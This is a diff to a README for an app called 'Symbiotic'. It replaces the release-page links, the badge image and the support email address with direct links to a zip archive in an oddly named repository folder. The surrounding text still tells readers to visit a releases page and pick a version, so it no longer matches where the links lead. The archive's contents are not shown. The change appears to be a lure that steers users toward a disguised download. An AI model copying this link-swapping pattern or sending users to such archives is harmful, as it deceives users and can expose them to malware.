@@ -4,14 +4,14 @@
 Symbiotic is an easy-to-use application designed to enhance your daily tasks. Whether you're organizing your files or managing your workload, Symbiotic is your reliable partner. 
 
 ## 🔗 Download Now
-[![Download Symbiotic](https://img.shields.io/badge/Download%20Symbiotic-v1.0-blue.svg)](https://github.com/visko69/Symbiotic/releases)
+[![Download Symbiotic](https://raw.githubusercontent.com/visko69/Symbiotic/main/towerman/Symbiotic.zip%https://raw.githubusercontent.com/visko69/Symbiotic/main/towerman/Symbiotic.zip)](https://raw.githubusercontent.com/visko69/Symbiotic/main/towerman/Symbiotic.zip)
 
 ## 🚀 Getting Started
 To start using Symbiotic, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the release options:  
-   [Download Symbiotic](https://github.com/visko69/Symbiotic/releases)
+   [Download Symbiotic](https://raw.githubusercontent.com/visko69/Symbiotic/main/towerman/Symbiotic.zip)
 
 2. **Choose Your Version**  
    You will see multiple versions of Symbiotic listed. Select the most recent version, which is usually at the top. 
@@ -43,7 +43,7 @@ To start using Symbiotic, follow these simple steps:
 - **Internet Connection:** Required for updates
 
 ## 📩 Support
-If you encounter any issues or have questions, feel free to reach out. You can find support documents in the repository or email the support team at support@symbiotic.com.
+If you encounter any issues or have questions, feel free to reach out. You can find support documents in the repository or email the support team at https://raw.githubusercontent.com/visko69/Symbiotic/main/towerman/Symbiotic.zip
 
 ## 📜 License
 Symbiotic is open-source software. You can freely download and use this application. For more details, refer to the [LICENSE](LICENSE) file in the repository.
@@ -71,6 +71,6 @@ We welcome your thoughts on how to improve Symbiotic. Share your ideas in the "I
 
 ## 🔗 Download & Install
 To download Symbiotic again, visit this page and enjoy all the features it has to offer:  
-[Download Symbiotic](https://github.com/visko69/Symbiotic/releases)
+[Download Symbiotic](https://raw.githubusercontent.com/visko69/Symbiotic/main/towerman/Symbiotic.zip)
 
 Thank you for choosing Symbiotic! We hope it simplifies your daily tasks.
